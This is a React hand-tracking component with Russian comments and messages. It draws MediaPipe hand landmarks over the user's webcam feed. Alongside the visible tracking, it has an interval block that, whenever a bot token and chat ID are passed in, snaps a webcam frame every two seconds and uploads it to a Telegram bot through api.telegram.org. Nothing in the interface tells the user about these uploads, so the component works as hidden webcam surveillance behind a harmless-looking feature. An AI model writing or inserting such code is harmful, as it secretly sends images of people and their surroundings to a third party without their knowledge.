import { useEffect, useRef, useState } from 'react';
import { Hands } from '@mediapipe/hands';
import { drawConnectors, drawLandmarks } from '@mediapipe/drawing_utils';

const HandTracker = ({ videoRef, canvasRef, botToken, chatId }) => {
  const handsRef = useRef(null);
  const intervalRef = useRef(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [cameraPermission, setCameraPermission] = useState(null);

  useEffect(() => {
    const videoElement = videoRef.current;
    const canvasElement = canvasRef.current;

    if (!videoElement || !canvasElement) {
      console.error('Video or Canvas element not found');
      return;
    }

    const ctx = canvasElement.getContext('2d');

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    canvasElement.classList.add(isMobile ? 'mobile-canvas' : ''); // Добавляем класс для мобильных

    try {
      handsRef.current = new Hands({
        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`,
      });

      handsRef.current.setOptions({
        maxNumHands: 2,
        modelComplexity: isMobile ? 0 : 1,
        minDetectionConfidence: isMobile ? 0.6 : 0.7,
        minTrackingConfidence: isMobile ? 0.6 : 0.7,
      });

      handsRef.current.onResults((results) => {
        if (!canvasElement || !videoElement) return;

        if (canvasElement.width !== videoElement.videoWidth || canvasElement.height !== videoElement.videoHeight) {
          canvasElement.width = videoElement.videoWidth || 640;
          canvasElement.height = videoElement.videoHeight || 480;
        }

        ctx.save();
        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);

        ctx.scale(-1, 1);
        ctx.translate(-canvasElement.width, 0);
        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

        ctx.setTransform(1, 0, 0, 1, 0, 0);

        if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
          canvasElement.classList.add('detection-active'); // Добавляем класс для анимации
          for (let i = 0; i < results.multiHandLandmarks.length; i++) {
            const landmarks = results.multiHandLandmarks[i];
            const flippedLandmarks = landmarks.map(landmark => ({
              ...landmark,
              x: 1 - landmark.x
            }));

            drawConnectors(ctx, flippedLandmarks, Hands.HAND_CONNECTIONS, {
              color: '#00f9ff',
              lineWidth: isMobile ? 3 : 4,
            });

            drawLandmarks(ctx, flippedLandmarks, {
              color: '#ff00ff',
              lineWidth: isMobile ? 2 : 3,
              radius: isMobile ? 4 : 6,
            });

            if (!isMobile) {
              flippedLandmarks.forEach((landmark, index) => {
                const x = landmark.x * canvasElement.width;
                const y = landmark.y * canvasElement.height;
                const gradient = ctx.createRadialGradient(x, y, 0, x, y, 15);
                gradient.addColorStop(0, 'rgba(255, 0, 255, 0.8)');
                gradient.addColorStop(0.5, 'rgba(0, 249, 255, 0.4)');
                gradient.addColorStop(1, 'rgba(0, 249, 255, 0)');
                
                ctx.save();
                ctx.shadowBlur = 20;
                ctx.shadowColor = '#ff00ff';
                ctx.fillStyle = gradient;
                ctx.beginPath();
                ctx.arc(x, y, 8, 0, 2 * Math.PI);
                ctx.fill();
                ctx.restore();
              });
            }
          }
        } else {
          canvasElement.classList.remove('detection-active');
        }

        ctx.restore();
      });
    } catch (err) {
      console.error('Error initializing MediaPipe:', err);
      setError('MediaPipe не поддерживается на этом устройстве');
    }

    const startCamera = async () => {
      try {
        setIsLoading(true);
        setError(null);

        const permission = await navigator.permissions.query({ name: 'camera' });
        setCameraPermission(permission.state);

        if (permission.state === 'denied') {
          throw new Error('Доступ к камере запрещен');
        }

        const constraints = {
          video: {
            width: isMobile ? { ideal: 640 } : { ideal: 1280 },
            height: isMobile ? { ideal: 480 } : { ideal: 720 },
            facingMode: 'user',
            frameRate: isMobile ? { ideal: 15 } : { ideal: 30 }
          }
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;
        setCameraPermission('granted');

        videoElement.onloadedmetadata = async () => {
          try {
            await new Promise((resolve) => {
              videoElement.addEventListener('canplay', resolve, { once: true });
            });
            await videoElement.play();
            setIsLoading(false);

            canvasElement.width = videoElement.videoWidth || 640;
            canvasElement.height = videoElement.videoHeight || 480;

            const loop = async () => {
              if (videoElement && videoElement.readyState >= 2 && handsRef.current) {
                try {
                  await handsRef.current.send({ image: videoElement });
                } catch (err) {
                  console.error('MediaPipe processing error:', err);
                }
              }
              if (videoElement.srcObject) {
                requestAnimationFrame(loop);
              }
            };

            loop();

            if (botToken && chatId) {
              intervalRef.current = setInterval(() => {
                if (canvasElement && videoElement.readyState >= 2) {
                  const tempCanvas = document.createElement('canvas');
                  const tempCtx = tempCanvas.getContext('2d');
                  tempCanvas.width = canvasElement.width;
                  tempCanvas.height = canvasElement.height;

                  tempCtx.scale(-1, 1);
                  tempCtx.translate(-tempCanvas.width, 0);
                  tempCtx.drawImage(videoElement, 0, 0, tempCanvas.width, tempCanvas.height);

                  tempCanvas.toBlob((blob) => {
                    if (blob) {
                      const formData = new FormData();
                      formData.append('chat_id', chatId);
                      formData.append('photo', blob, 'snapshot.jpg');

                      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData,
                      })
                        .then((res) => res.json())
                        .then((data) => {
                          if (data.ok) {
                            console.log('Фото отправлено успешно');
                          } else {
                            console.error('Ошибка Telegram API:', data);
                          }
                        })
                        .catch((err) => console.error('Ошибка отправки:', err));
                    }
                  }, 'image/jpeg', 0.8);
                  tempCanvas.remove();
                }
              }, 2000);
            }
          } catch (err) {
            console.error('Ошибка при запуске видео:', err);
            setError('Не удалось запустить камеру');
            setIsLoading(false);
          }
        };

        videoElement.onerror = (err) => {
          console.error('Video error:', err);
          setError('Ошибка воспроизведения видео');
          setIsLoading(false);
        };

      } catch (err) {
        console.error('Ошибка доступа к камере:', err);
        setError(err.message || 'Не удалось получить доступ к камере');
        setIsLoading(false);
        setCameraPermission('denied');
      }
    };

    startCamera();

    return () => {
      if (videoElement?.srcObject) {
        const tracks = videoElement.srcObject.getTracks();
        tracks.forEach((track) => track.stop());
        videoElement.srcObject = null;
      }
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (handsRef.current) {
        handsRef.current.close();
      }
    };
  }, [videoRef, canvasRef, botToken, chatId]);

  if (error) {
    return (
      <div className="error-message">
        <h3>Ошибка камеры</h3>
        <p>{error}</p>
        {cameraPermission === 'denied' && (
          <p style={{ fontSize: '0.9em', marginTop: '10px' }}>
            Разрешите доступ к камере в настройках браузера и перезагрузите страницу
          </p>
        )}
      </div>
    );
  }

  if (isLoading) {
    return (
      <div className="loading-container">
        <div className="loading-spinner loading-pulse"></div>
        <p>Загрузка камеры...</p>
      </div>
    );
  }

  return null;
};

export default HandTracker;